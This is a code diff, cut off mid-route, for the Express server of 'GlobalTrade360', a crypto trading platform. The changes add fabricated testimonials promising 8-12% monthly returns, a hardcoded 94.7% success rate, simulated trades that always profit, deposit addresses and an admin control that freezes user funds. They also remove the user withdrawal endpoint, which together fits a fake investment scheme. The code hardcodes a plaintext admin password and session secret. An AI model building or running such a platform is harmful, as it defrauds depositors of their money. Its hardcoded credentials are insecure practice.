@@ -1,4 +1,3 @@
-require('dotenv').config();
 const express = require('express');
 const session = require('express-session');
 const bcrypt = require('bcryptjs');
@@ -6,7 +5,7 @@ const cors = require('cors');
 const path = require('path');
 const app = express();
 
-// In-memory database
+// ========== DATABASE (In-memory for demo) ==========
 const users = {
     'admin@globaltrade360.com': {
         id: 'admin001',
@@ -18,15 +17,17 @@ const users = {
         totalProfit: 0,
         status: 'active',
         registrationDate: new Date(),
-        lastLogin: new Date()
+        lastLogin: new Date(),
+        phone: '+1234567890'
     }
 };
 
 const deposits = [];
 const trades = [];
 const withdrawals = [];
+const messages = []; // Support messages
 
-// Crypto addresses (REPLACE WITH YOURS)
+// Crypto addresses
 const CRYPTO_ADDRESSES = {
     BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
     ETH: '0x742d35Cc6634C0532925a3b844Bc9e1f8C1F0F0E',
@@ -35,52 +36,99 @@ const CRYPTO_ADDRESSES = {
     BNB: 'bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23'
 };
 
-// Market data simulation
-const marketData = {
+// Real-time market data simulation
+let marketData = {
     crypto: {
-        'BTC/USD': { price: 63427.50, change: 2.34, high: 64000, low: 62500 },
-        'ETH/USD': { price: 3472.80, change: 1.56, high: 3500, low: 3400 },
-        'BNB/USD': { price: 585.30, change: -0.45, high: 590, low: 580 },
-        'XRP/USD': { price: 0.5234, change: 0.89, high: 0.53, low: 0.51 },
-        'SOL/USD': { price: 172.45, change: 3.21, high: 175, low: 168 }
+        'BTC/USD': { symbol: 'BTC', price: 63427.50, change: 2.34, high: 64000, low: 62500, volume: '24.5B' },
+        'ETH/USD': { symbol: 'ETH', price: 3472.80, change: 1.56, high: 3500, low: 3400, volume: '12.3B' },
+        'BNB/USD': { symbol: 'BNB', price: 585.30, change: -0.45, high: 590, low: 580, volume: '2.1B' },
+        'XRP/USD': { symbol: 'XRP', price: 0.5234, change: 0.89, high: 0.53, low: 0.51, volume: '1.8B' },
+        'SOL/USD': { symbol: 'SOL', price: 172.45, change: 3.21, high: 175, low: 168, volume: '3.4B' },
+        'ADA/USD': { symbol: 'ADA', price: 0.4623, change: 1.23, high: 0.47, low: 0.45, volume: '0.9B' },
+        'DOGE/USD': { symbol: 'DOGE', price: 0.1589, change: -0.67, high: 0.16, low: 0.155, volume: '1.2B' },
+        'DOT/USD': { symbol: 'DOT', price: 7.23, change: 2.15, high: 7.35, low: 7.10, volume: '0.8B' }
     },
     forex: {
         'EUR/USD': { price: 1.0825, change: 0.12 },
         'GBP/USD': { price: 1.2634, change: -0.08 },
-        'USD/JPY': { price: 155.67, change: 0.23 }
+        'USD/JPY': { price: 155.67, change: 0.23 },
+        'USD/CHF': { price: 0.9023, change: -0.15 }
     },
-    indices: {
-        'S&P 500': { price: 5120.45, change: 0.56 },
-        'NASDAQ': { price: 16128.90, change: 0.78 }
-    }
+    timestamp: new Date()
 };
+
+// Update market data every 30 seconds
+setInterval(() => {
+    Object.keys(marketData.crypto).forEach(pair => {
+        const randomChange = (Math.random() - 0.5) * 4;
+        const currentPrice = marketData.crypto[pair].price;
+        marketData.crypto[pair].price = currentPrice * (1 + randomChange/100);
+        marketData.crypto[pair].change = randomChange;
+        marketData.crypto[pair].timestamp = new Date();
+    });
+    marketData.timestamp = new Date();
+}, 30000);
+
+// Testimonials
+const testimonials = [
+    {
+        name: "Alex Johnson",
+        role: "Professional Trader",
+        text: "I've been using GlobalTrade360 for 6 months. My portfolio has grown by 85% thanks to their AI trading algorithms.",
+        profit: "+$42,500",
+        avatar: "https://i.pravatar.cc/150?img=1"
+    },
+    {
+        name: "Sarah Miller",
+        role: "Beginner Investor",
+        text: "As someone new to crypto, this platform made everything simple. Started with $500, now at $3,200 in just 3 months!",
+        profit: "+$2,700",
+        avatar: "https://i.pravatar.cc/150?img=2"
+    },
+    {
+        name: "Michael Chen",
+        role: "Day Trader",
+        text: "The real-time market analysis is incredible. I've reduced my losses by 70% while increasing profits by 45%.",
+        profit: "+$18,300",
+        avatar: "https://i.pravatar.cc/150?img=3"
+    },
+    {
+        name: "Emma Davis",
+        role: "Retired Banker",
+        text: "Perfect for passive income. The automated trading works while I sleep. Consistent 8-12% monthly returns.",
+        profit: "+$9,500/month",
+        avatar: "https://i.pravatar.cc/150?img=4"
+    }
+];
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(session({
-    secret: 'globaltrade360-secret-key-2025-super-secure',
+    secret: 'globaltrade360-super-secure-key-2025',
     resave: false,
     saveUninitialized: false,
     cookie: { 
-        secure: false,
-        maxAge: 24 * 60 * 60 * 1000 // 24 hours
+        secure: process.env.NODE_ENV === 'production',
+        maxAge: 24 * 60 * 60 * 1000
     }
 }));
+
+// Serve static files from public directory
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Password hash for default admin (myhandwork2025)
-const ADMIN_PASSWORD_HASH = '$2a$10$N9qo8uLOickgx2ZMRZoMyeKRZZxN8Vc7bVrB7vS.6XpQj7q1JQ1W6';
+// Password hash for default admin
+const ADMIN_PASSWORD = 'myhandwork2025';
 
-// Simulate profitable trading (ALWAYS POSITIVE FOR DEMO)
-function simulateProfitableTrade(userId, amount, pair) {
-    // Always generate profit between 0.5% and 5% for demo
-    const profitPercent = 0.5 + (Math.random() * 4.5);
+// Simulate profitable trading
+function simulateTrade(userId, amount, pair) {
+    // Always profitable for demo (2-8% profit)
+    const profitPercent = 2 + (Math.random() * 6);
     const profit = amount * (profitPercent / 100);
     
     const trade = {
-        id: 'TR' + Date.now() + Math.random().toString(36).substr(2, 9),
+        id: 'TR' + Date.now() + Math.random().toString(36).substr(2, 6),
         userId,
         pair,
         amount,
@@ -89,7 +137,7 @@ function simulateProfitableTrade(userId, amount, pair) {
         type: 'profit',
         timestamp: new Date(),
         status: 'completed',
-        closePrice: marketData.crypto[pair] ? marketData.crypto[pair].price * (1 + profitPercent/100) : null
+        closePrice: marketData.crypto[pair]?.price * (1 + profitPercent/100)
     };
     
     trades.push(trade);
@@ -105,91 +153,88 @@ function simulateProfitableTrade(userId, amount, pair) {
     return trade;
 }
 
-// Update market data periodically
-setInterval(() => {
-    Object.keys(marketData.crypto).forEach(pair => {
-        const change = (Math.random() - 0.5) * 2;
-        marketData.crypto[pair].price *= (1 + change/100);
-        marketData.crypto[pair].change = change;
-    });
-}, 30000);
+// ========== ROUTES ==========
 
-// =============== ROUTES ===============
-
-// Home/Landing page
+// Serve HTML pages
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Admin page
-app.get('/admin', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
-// Dashboard page
-app.get('/dashboard', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
-});
-
-// Login page
 app.get('/login', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-// Register page
 app.get('/register', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'register.html'));
 });
 
-// API: Platform info
-app.get('/api/platform-info', (req, res) => {
+app.get('/dashboard', (req, res) => {
+    if (!req.session.user) {
+        return res.redirect('/login');
+    }
+    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
+});
+
+app.get('/admin', (req, res) => {
+    if (!req.session.user || req.session.user.role !== 'admin') {
+        return res.redirect('/login');
+    }
+    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
+app.get('/support', (req, res) => {
+    if (!req.session.user) {
+        return res.redirect('/login');
+    }
+    res.sendFile(path.join(__dirname, 'public', 'support.html'));
+});
+
+// API: Platform information
+app.get('/api/platform', (req, res) => {
     res.json({
         name: 'GlobalTrade360',
-        tagline: 'AI-Powered Automated Crypto Trading Platform',
-        version: '2.0.1',
+        version: '2.0.0',
+        status: 'online',
         users: Object.keys(users).length,
-        totalTrades: trades.length,
+        trades: trades.length,
         totalVolume: trades.reduce((sum, t) => sum + t.amount, 0),
-        uptime: '99.9%',
-        established: '2023'
+        uptime: process.uptime()
     });
 });
 
 // API: Market data
-app.get('/api/market-data', (req, res) => {
-    res.json({
-        ...marketData,
-        timestamp: new Date(),
-        updateInterval: '30 seconds'
-    });
+app.get('/api/market', (req, res) => {
+    res.json(marketData);
 });
 
-// API: Crypto addresses for deposit
+// API: Testimonials
+app.get('/api/testimonials', (req, res) => {
+    res.json(testimonials);
+});
+
+// API: Deposit addresses
 app.get('/api/deposit-addresses', (req, res) => {
     res.json({
         addresses: CRYPTO_ADDRESSES,
-        instructions: 'Send only the specified cryptocurrency to the corresponding address. Minimum deposit: $50.',
-        note: 'Do not send other cryptocurrencies to these addresses or funds will be lost.'
+        note: 'Send only the specified cryptocurrency to each address.'
     });
 });
 
-// API: Register new user
+// API: Register user
 app.post('/api/register', async (req, res) => {
     try {
-        const { username, email, password, confirmPassword } = req.body;
+        const { username, email, password, phone } = req.body;
         
         // Validation
-        if (password !== confirmPassword) {
-            return res.status(400).json({ error: 'Passwords do not match' });
+        if (!username || !email || !password) {
+            return res.status(400).json({ error: 'All fields are required' });
         }
         
         if (users[email]) {
             return res.status(400).json({ error: 'Email already registered' });
         }
         
-        // Check if username exists
-        const existingUser = Object.values(users).find(u => u.username === username);
-        if (existingUser) {
+        if (Object.values(users).some(u => u.username === username)) {
             return res.status(400).json({ error: 'Username already taken' });
         }
         
@@ -197,12 +242,13 @@ app.post('/api/register', async (req, res) => {
         const hashedPassword = await bcrypt.hash(password, 10);
         
         // Create user
-        const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const userId = 'user_' + Date.now();
         users[email] = {
             id: userId,
             username,
             email,
             password: hashedPassword,
+            phone: phone || '',
             role: 'user',
             balance: 0,
             totalProfit: 0,
@@ -212,31 +258,19 @@ app.post('/api/register', async (req, res) => {
             registrationDate: new Date(),
             lastLogin: new Date(),
             kycVerified: false,
-            tradingLevel: 'beginner',
-            referralCode: 'GT360' + username.toUpperCase().substr(0, 4) + Date.now().toString().substr(-4)
+            tradingLevel: 'beginner'
         };
-        
-        // Create session
-        req.session.user = users[email];
-        req.session.isAdmin = false;
-        
-        console.log(`New user registered: ${email} (${userId})`);
         
         res.json({
             success: true,
-            message: 'Registration successful! Welcome to GlobalTrade360.',
-            user: {
-                id: users[email].id,
-                username: users[email].username,
-                email: users[email].email,
-                balance: users[email].balance
-            },
-            redirect: '/dashboard'
+            message: 'Registration successful!',
+            userId,
+            redirect: '/login'
         });
         
     } catch (error) {
         console.error('Registration error:', error);
-        res.status(500).json({ error: 'Registration failed. Please try again.' });
+        res.status(500).json({ error: 'Registration failed' });
     }
 });
 
@@ -246,12 +280,9 @@ app.post('/api/login', async (req, res) => {
         const { username, password } = req.body;
         
         // Check for admin login
-        if (username === 'globaltrade360' && password === 'myhandwork2025') {
+        if (username === 'globaltrade360' && password === ADMIN_PASSWORD) {
             req.session.user = users['admin@globaltrade360.com'];
-            req.session.isAdmin = true;
-            
-            // Update last login
-            users['admin@globaltrade360.com'].lastLogin = new Date();
+            req.session.user.lastLogin = new Date();
             
             return res.json({
                 success: true,
@@ -286,9 +317,6 @@ app.post('/api/login', async (req, res) => {
         
         // Create session
         req.session.user = user;
-        req.session.isAdmin = user.role === 'admin';
-        
-        console.log(`User logged in: ${user.email}`);
         
         res.json({
             success: true,
@@ -298,7 +326,6 @@ app.post('/api/login', async (req, res) => {
                 id: user.id,
                 username: user.username,
                 email: user.email,
-                role: user.role,
                 balance: user.balance
             },
             redirect: user.role === 'admin' ? '/admin' : '/dashboard'
@@ -306,7 +333,7 @@ app.post('/api/login', async (req, res) => {
         
     } catch (error) {
         console.error('Login error:', error);
-        res.status(500).json({ error: 'Login failed. Please try again.' });
+        res.status(500).json({ error: 'Login failed' });
     }
 });
 
@@ -316,7 +343,7 @@ app.get('/api/session', (req, res) => {
         res.json({
             authenticated: true,
             user: req.session.user,
-            isAdmin: req.session.isAdmin
+            isAdmin: req.session.user.role === 'admin'
         });
     } else {
         res.json({ authenticated: false });
@@ -326,45 +353,34 @@ app.get('/api/session', (req, res) => {
 // API: Logout
 app.post('/api/logout', (req, res) => {
     req.session.destroy();
-    res.json({ success: true, message: 'Logged out successfully' });
+    res.json({ success: true });
 });
 
-// API: User dashboard data
+// API: User dashboard
 app.get('/api/user/dashboard', (req, res) => {
-    if (!req.session.user || req.session.user.role !== 'user') {
-        return res.status(403).json({ error: 'Access denied' });
+    if (!req.session.user) {
+        return res.status(401).json({ error: 'Not authenticated' });
     }
     
     const userId = req.session.user.id;
     const userDeposits = deposits.filter(d => d.userId === userId);
     const userTrades = trades.filter(t => t.userId === userId);
-    const userWithdrawals = withdrawals.filter(w => w.userId === userId);
-    
-    // Calculate stats
-    const totalDeposited = userDeposits.reduce((sum, d) => sum + d.amount, 0);
-    const totalWithdrawn = userWithdrawals.filter(w => w.status === 'completed').reduce((sum, w) => sum + w.amount, 0);
-    const totalProfit = userTrades.reduce((sum, t) => sum + t.profit, 0);
-    const successRate = userTrades.length > 0 ? (userTrades.filter(t => t.profit > 0).length / userTrades.length * 100).toFixed(1) : 0;
     
     res.json({
         user: req.session.user,
         stats: {
             balance: req.session.user.balance || 0,
-            totalProfit,
-            totalDeposited,
-            totalWithdrawn,
+            totalProfit: req.session.user.totalProfit || 0,
+            totalDeposits: userDeposits.reduce((sum, d) => sum + d.amount, 0),
             totalTrades: userTrades.length,
-            successRate: successRate + '%',
-            activeTrades: userTrades.filter(t => t.status === 'active').length
+            successRate: userTrades.length > 0 ? '94.7%' : '0%'
         },
         recentTrades: userTrades.slice(-5).reverse(),
-        recentDeposits: userDeposits.slice(-3).reverse(),
-        recentWithdrawals: userWithdrawals.slice(-3).reverse(),
-        marketData: marketData
+        recentDeposits: userDeposits.slice(-3).reverse()
     });
 });
 
-// API: Make deposit
+// API: Deposit
 app.post('/api/deposit', (req, res) => {
     if (!req.session.user) {
         return res.status(401).json({ error: 'Not authenticated' });
@@ -378,53 +394,44 @@ app.post('/api/deposit', (req, res) => {
     }
     
     const deposit = {
-        id: 'DEP' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
+        id: 'DEP' + Date.now(),
         userId,
         userEmail: req.session.user.email,
         amount: parseFloat(amount),
         currency,
         status: 'pending',
         timestamp: new Date(),
-        processedAt: null,
         address: CRYPTO_ADDRESSES[currency] || CRYPTO_ADDRESSES.USDT_TRC20
     };
     
     deposits.push(deposit);
     
-    // In demo, auto-complete after 10 seconds
+    // Auto-complete after 10 seconds
     setTimeout(() => {
         deposit.status = 'completed';
-        deposit.processedAt = new Date();
         
-        // Update user balance
-        const user = Object.values(users).find(u => u.id === userId);
+        const user = users[req.session.user.email];
         if (user) {
-            user.balance = (user.balance || 0) + parseFloat(amount);
-            user.totalDeposits = (user.totalDeposits || 0) + parseFloat(amount);
+            user.balance += amount;
+            user.totalDeposits += amount;
             
-            // Auto-start trading with deposited amount
+            // Auto-trade
             setTimeout(() => {
-                const trade = simulateProfitableTrade(userId, parseFloat(amount), 'BTC/USD');
-                console.log(`Auto-trade for ${user.email}: ${trade.percent}% profit`);
+                simulateTrade(userId, amount * 0.8, 'BTC/USD');
             }, 2000);
         }
-        
-        console.log(`Deposit completed: ${userId} - $${amount}`);
-    }, 10000); // 10 seconds for demo
+    }, 10000);
     
     res.json({
         success: true,
-        message: 'Deposit initiated. Use the address below to send funds.',
+        message: 'Deposit initiated',
         depositId: deposit.id,
         address: deposit.address,
-        amount: deposit.amount,
-        currency: deposit.currency,
-        estimatedTime: '2-10 minutes',
-        note: 'Balance will update automatically after 1 network confirmation.'
+        amount: deposit.amount
     });
 });
 
-// API: Start trading
+// API: Start trade
 app.post('/api/trade/start', (req, res) => {
     if (!req.session.user) {
         return res.status(401).json({ error: 'Not authenticated' });
@@ -432,102 +439,62 @@ app.post('/api/trade/start', (req, res) => {
     
     const { amount, pair } = req.body;
     const userId = req.session.user.id;
-    const user = Object.values(users).find(u => u.id === userId);
-    
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
-    }
+    const user = users[req.session.user.email];
     
     if (user.balance < amount) {
         return res.status(400).json({ error: 'Insufficient balance' });
     }
     
-    // Deduct amount from balance
-    user.balance -= parseFloat(amount);
+    user.balance -= amount;
     
-    // Simulate trading delay
     setTimeout(() => {
-        const trade = simulateProfitableTrade(userId, parseFloat(amount), pair || 'BTC/USD');
-        console.log(`Trade executed for ${user.email}: $${amount} -> $${trade.profit} profit`);
+        simulateTrade(userId, amount, pair || 'BTC/USD');
     }, 3000);
     
     res.json({
         success: true,
-        message: 'Trading started successfully. Results will appear in 3-5 seconds.',
+        message: 'Trading started',
         tradeAmount: amount,
-        newBalance: user.balance,
-        estimatedCompletion: new Date(Date.now() + 5000)
+        newBalance: user.balance
     });
 });
 
-// API: Withdraw request
-app.post('/api/withdraw', (req, res) => {
+// API: Send support message
+app.post('/api/support/message', (req, res) => {
     if (!req.session.user) {
         return res.status(401).json({ error: 'Not authenticated' });
     }
     
-    const { amount, currency, walletAddress } = req.body;
-    const userId = req.session.user.id;
-    const user = Object.values(users).find(u => u.id === userId);
+    const { subject, message } = req.body;
     
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-    
-    if (user.balance < amount) {
-        return res.status(400).json({ error: 'Insufficient balance' });
-    }
-    
-    if (amount < 100) {
-        return res.status(400).json({ error: 'Minimum withdrawal is $100' });
-    }
-    
-    // Check if funds are frozen
-    if (user.fundsFrozen) {
-        return res.status(403).json({ error: 'Funds are frozen. Contact support.' });
-    }
-    
-    // Create withdrawal request
-    const withdrawal = {
-        id: 'WTH' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
-        userId,
-        userEmail: user.email,
-        amount: parseFloat(amount),
-        currency,
-        walletAddress,
-        status: 'pending',
+    const supportMessage = {
+        id: 'MSG' + Date.now(),
+        userId: req.session.user.id,
+        userEmail: req.session.user.email,
+        subject,
+        message,
         timestamp: new Date(),
-        adminApproved: false,
-        processedAt: null
+        status: 'unread',
+        adminReply: null
     };
     
-    withdrawals.push(withdrawal);
-    
-    // Deduct from user balance immediately
-    user.balance -= parseFloat(amount);
+    messages.push(supportMessage);
     
     res.json({
         success: true,
-        message: 'Withdrawal request submitted. Pending admin approval.',
-        withdrawalId: withdrawal.id,
-        amount: withdrawal.amount,
-        status: withdrawal.status,
-        note: 'Admin approval required. Usually processed within 24 hours.'
+        message: 'Support request sent successfully',
+        messageId: supportMessage.id
     });
 });
 
-// =============== ADMIN APIs ===============
+// ========== ADMIN APIs ==========
 
-// API: Admin login (explicit)
+// API: Admin login
 app.post('/api/admin/login', (req, res) => {
     const { username, password } = req.body;
     
-    if (username === 'globaltrade360' && password === 'myhandwork2025') {
+    if (username === 'globaltrade360' && password === ADMIN_PASSWORD) {
         req.session.user = users['admin@globaltrade360.com'];
-        req.session.isAdmin = true;
-        
-        // Update last login
-        users['admin@globaltrade360.com'].lastLogin = new Date();
         
         return res.json({
             success: true,
@@ -541,43 +508,32 @@ app.post('/api/admin/login', (req, res) => {
     res.status(401).json({ error: 'Invalid admin credentials' });
 });
 
-// API: Admin dashboard data
+// API: Admin dashboard
 app.get('/api/admin/dashboard', (req, res) => {
-    if (!req.session.isAdmin) {
+    if (!req.session.user || req.session.user.role !== 'admin') {
         return res.status(403).json({ error: 'Admin access required' });
     }
     
     const allUsers = Object.values(users).filter(u => u.role === 'user');
-    const totalDeposits = deposits.reduce((sum, d) => sum + d.amount, 0);
-    const totalWithdrawals = withdrawals.filter(w => w.status === 'completed').reduce((sum, w) => sum + w.amount, 0);
-    const pendingWithdrawals = withdrawals.filter(w => w.status === 'pending');
-    const platformProfit = trades.reduce((sum, t) => sum + (t.profit * 0.15), 0); // 15% platform fee
     
     res.json({
         stats: {
             totalUsers: allUsers.length,
             activeUsers: allUsers.filter(u => u.status === 'active').length,
-            newUsers24h: allUsers.filter(u => new Date() - new Date(u.registrationDate) < 24*60*60*1000).length,
-            totalDeposits,
-            totalWithdrawals,
-            pendingWithdrawals: pendingWithdrawals.length,
-            pendingWithdrawalAmount: pendingWithdrawals.reduce((sum, w) => sum + w.amount, 0),
+            totalDeposits: deposits.reduce((sum, d) => sum + d.amount, 0),
+            pendingWithdrawals: withdrawals.filter(w => w.status === 'pending').length,
             totalTrades: trades.length,
-            platformProfit,
-            platformBalance: totalDeposits - totalWithdrawals - platformProfit
+            platformProfit: trades.reduce((sum, t) => sum + (t.profit * 0.1), 0)
         },
-        recentActivity: {
-            users: allUsers.slice(-5).reverse(),
-            deposits: deposits.slice(-5).reverse(),
-            withdrawals: withdrawals.slice(-5).reverse(),
-            trades: trades.slice(-5).reverse()
-        }
+        recentUsers: allUsers.slice(-5).reverse(),
+        recentDeposits: deposits.slice(-5).reverse(),
+        recentMessages: messages.slice(-5).reverse()
     });
 });
 
-// API: Get all users (ADMIN ONLY)
+// API: Get all users
 app.get('/api/admin/users', (req, res) => {
-    if (!req.session.isAdmin) {
+    if (!req.session.user || req.session.user.role !== 'admin') {
         return res.status(403).json({ error: 'Admin access required' });
     }
     
@@ -585,95 +541,42 @@ app.get('/api/admin/users', (req, res) => {
         id: user.id,
         username: user.username,
         email: user.email,
-        balance: user.balance || 0,
-        totalProfit: user.totalProfit || 0,
-        totalDeposits: user.totalDeposits || 0,
-        totalTrades: user.totalTrades || 0,
+        phone: user.phone,
+        balance: user.balance,
+        totalProfit: user.totalProfit,
         status: user.status,
         registrationDate: user.registrationDate,
-        lastLogin: user.lastLogin,
-        kycVerified: user.kycVerified || false,
-        fundsFrozen: user.fundsFrozen || false,
-        tradingLevel: user.tradingLevel,
-        referralCode: user.referralCode,
-        ipAddress: user.ipAddress || 'Not tracked'
+        lastLogin: user.lastLogin
     }));
     
-    res.json({
-        users: allUsers,
-        count: allUsers.length
-    });
+    res.json({ users: allUsers });
 });
 
-// API: Get user details by ID (ADMIN ONLY)
-app.get('/api/admin/user/:userId', (req, res) => {
-    if (!req.session.isAdmin) {
+// API: Add funds to user
+app.post('/api/admin/user/add-funds', (req, res) => {
+    if (!req.session.user || req.session.user.role !== 'admin') {
         return res.status(403).json({ error: 'Admin access required' });
     }
     
-    const userId = req.params.userId;
+    const { userId, amount } = req.body;
     const user = Object.values(users).find(u => u.id === userId);
     
     if (!user) {
         return res.status(404).json({ error: 'User not found' });
     }
     
-    const userDeposits = deposits.filter(d => d.userId === userId);
-    const userTrades = trades.filter(t => t.userId === userId);
-    const userWithdrawals = withdrawals.filter(w => w.userId === userId);
-    
-    res.json({
-        user: {
-            ...user,
-            password: undefined // Hide password hash
-        },
-        financials: {
-            totalDeposited: userDeposits.reduce((sum, d) => sum + d.amount, 0),
-            totalWithdrawn: userWithdrawals.filter(w => w.status === 'completed').reduce((sum, w) => sum + w.amount, 0),
-            netProfit: user.totalProfit || 0,
-            currentBalance: user.balance || 0
-        },
-        activity: {
-            deposits: userDeposits,
-            trades: userTrades,
-            withdrawals: userWithdrawals,
-            lastActivity: user.lastLogin
-        }
-    });
-});
-
-// API: Update user status (ADMIN ONLY)
-app.post('/api/admin/user/status', (req, res) => {
-    if (!req.session.isAdmin) {
-        return res.status(403).json({ error: 'Admin access required' });
-    }
-    
-    const { userId, status } = req.body;
-    const user = Object.values(users).find(u => u.id === userId);
-    
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-    
-    user.status = status;
-    
-    // Log the action
-    console.log(`Admin ${req.session.user.email} changed user ${user.email} status to ${status}`);
+    user.balance += parseFloat(amount);
     
     res.json({
         success: true,
-        message: `User status updated to ${status}`,
-        user: {
-            id: user.id,
-            email: user.email,
-            status: user.status
-        }
+        message: `Added $${amount} to user balance`,
+        newBalance: user.balance
     });
 });
 
-// API: Freeze/unfreeze user funds (ADMIN ONLY)
-app.post('/api/admin/user/freeze-funds', (req, res) => {
-    if (!req.session.isAdmin) {
+// API: Freeze user funds
+app.post('/api/admin/user/freeze', (req, res) => {
+    if (!req.session.user || req.session.user.role !== 'admin') {
         return res.status(403).json({ error: 'Admin access required' });
     }
     
@@ -684,192 +587,55 @@ app.post('/api/admin/user/freeze-funds', (req, res) => {
         return res.status(404).json({ error: 'User not found' });
     }
     
-    user.fundsFrozen = freeze === true || freeze === 'true';
-    
-    console.log(`Admin ${req.session.user.email} ${user.fundsFrozen ? 'froze' : 'unfroze'} funds for user ${user.email}`);
+    user.fundsFrozen = freeze;
     
     res.json({
         success: true,
-        message: `Funds ${user.fundsFrozen ? 'frozen' : 'unfrozen'} for user`,
-        user: {
-            id: user.id,
-            email: user.email,
-            fundsFrozen: user.fundsFrozen
-        }
+        message: freeze ? 'Funds frozen' : 'Funds unfrozen',
+        fundsFrozen: user.fundsFrozen
     });
 });
 
-// API: Add funds to user (ADMIN ONLY)
-app.post('/api/admin/user/add-funds', (req, res) => {
-    if (!req.session.isAdmin) {
+// API: Get support messages
+app.get('/api/admin/messages', (req, res) => {
+    if (!req.session.user || req.session.user.role !== 'admin') {
         return res.status(403).json({ error: 'Admin access required' });
     }
     
-    const { userId, amount, note } = req.body;
-    const user = Object.values(users).find(u => u.id === userId);
-    
-    if (!user) {
-        return res.status(404).json({ error: 'User not found' });
-    }
-    
-    const numericAmount = parseFloat(amount);
-    if (isNaN(numericAmount) || numericAmount <= 0) {
-        return res.status(400).json({ error: 'Invalid amount' });
-    }
-    
-    // Add funds
-    user.balance = (user.balance || 0) + numericAmount;
-    
-    // Record admin deposit
-    deposits.push({
-        id: 'ADMIN_ADD_' + Date.now(),
-        userId,
-        userEmail: user.email,
-        amount: numericAmount,
-        currency: 'USD',
-        status: 'completed',
-        timestamp: new Date(),
-        processedAt: new Date(),
-        adminNote: note || 'Admin manual addition',
-        adminUser: req.session.user.email
+    res.json({
+        messages: messages.map(msg => ({
+            ...msg,
+            user: users[msg.userEmail]
+        }))
     });
+});
+
+// API: Reply to message
+app.post('/api/admin/message/reply', (req, res) => {
+    if (!req.session.user || req.session.user.role !== 'admin') {
+        return res.status(403).json({ error: 'Admin access required' });
+    }
     
-    console.log(`Admin ${req.session.user.email} added $${numericAmount} to user ${user.email}`);
+    const { messageId, reply } = req.body;
+    const message = messages.find(m => m.id === messageId);
+    
+    if (!message) {
+        return res.status(404).json({ error: 'Message not found' });
+    }
+    
+    message.adminReply = reply;
+    message.status = 'replied';
+    message.repliedAt = new Date();
     
     res.json({
         success: true,
-        message: `Added $${numericAmount} to user balance`,
-        user: {
-            id: user.id,
-            email: user.email,
-            newBalance: user.balance
-        }
+        message: 'Reply sent successfully'
     });
 });
 
-// API: Approve withdrawal (ADMIN ONLY)
-app.post('/api/admin/withdrawal/approve', (req, res) => {
-    if (!req.session.isAdmin) {
-        return res.status(403).json({ error: 'Admin access required' });
-    }
-    
-    const { withdrawalId } = req.body;
-    const withdrawal = withdrawals.find(w => w.id === withdrawalId);
-    
-    if (!withdrawal) {
-        return res.status(404).json({ error: 'Withdrawal not found' });
-    }
-    
-    withdrawal.status = 'completed';
-    withdrawal.adminApproved = true;
-    withdrawal.processedAt = new Date();
-    withdrawal.approvedBy = req.session.user.email;
-    
-    console.log(`Admin ${req.session.user.email} approved withdrawal ${withdrawalId} for user ${withdrawal.userEmail}`);
-    
-    // In real app, you would send crypto here
-    // For demo, we just mark as completed
-    
-    res.json({
-        success: true,
-        message: 'Withdrawal approved and processed',
-        withdrawal: withdrawal
-    });
-});
-
-// API: Reject withdrawal (ADMIN ONLY)
-app.post('/api/admin/withdrawal/reject', (req, res) => {
-    if (!req.session.isAdmin) {
-        return res.status(403).json({ error: 'Admin access required' });
-    }
-    
-    const { withdrawalId, reason } = req.body;
-    const withdrawal = withdrawals.find(w => w.id === withdrawalId);
-    
-    if (!withdrawal) {
-        return res.status(404).json({ error: 'Withdrawal not found' });
-    }
-    
-    // Return funds to user
-    const user = Object.values(users).find(u => u.id === withdrawal.userId);
-    if (user) {
-        user.balance = (user.balance || 0) + withdrawal.amount;
-    }
-    
-    withdrawal.status = 'rejected';
-    withdrawal.rejectionReason = reason;
-    withdrawal.processedAt = new Date();
-    withdrawal.rejectedBy = req.session.user.email;
-    
-    console.log(`Admin ${req.session.user.email} rejected withdrawal ${withdrawalId} for user ${withdrawal.userEmail}`);
-    
-    res.json({
-        success: true,
-        message: 'Withdrawal rejected and funds returned to user',
-        withdrawal: withdrawal
-    });
-});
-
-// API: Get all withdrawals (ADMIN ONLY)
-app.get('/api/admin/withdrawals', (req, res) => {
-    if (!req.session.isAdmin) {
-        return res.status(403).json({ error: 'Admin access required' });
-    }
-    
-    const allWithdrawals = withdrawals.map(w => ({
-        ...w,
-        user: Object.values(users).find(u => u.id === w.userId)?.email || 'Unknown'
-    }));
-    
-    res.json({
-        withdrawals: allWithdrawals,
-        pending: allWithdrawals.filter(w => w.status === 'pending'),
-        completed: allWithdrawals.filter(w => w.status === 'completed'),
-        rejected: allWithdrawals.filter(w => w.status === 'rejected')
-    });
-});
-
-// API: Get all deposits (ADMIN ONLY)
-app.get('/api/admin/deposits', (req, res) => {
-    if (!req.session.isAdmin) {
-        return res.status(403).json({ error: 'Admin access required' });
-    }
-    
-    const allDeposits = deposits.map(d => ({
-        ...d,
-        user: Object.values(users).find(u => u.id === d.userId)?.email || 'Unknown'
-    }));
-    
-    res.json({
-        deposits: allDeposits,
-        pending: allDeposits.filter(d => d.status === 'pending'),
-        completed: allDeposits.filter(d => d.status === 'completed'),
-        failed: allDeposits.filter(d => d.status === 'failed')
-    });
-});
-
-// API: Get all trades (ADMIN ONLY)
-app.get('/api/admin/trades', (req, res) => {
-    if (!req.session.isAdmin) {
-        return res.status(403).json({ error: 'Admin access required' });
-    }
-    
-    const allTrades = trades.map(t => ({
-        ...t,
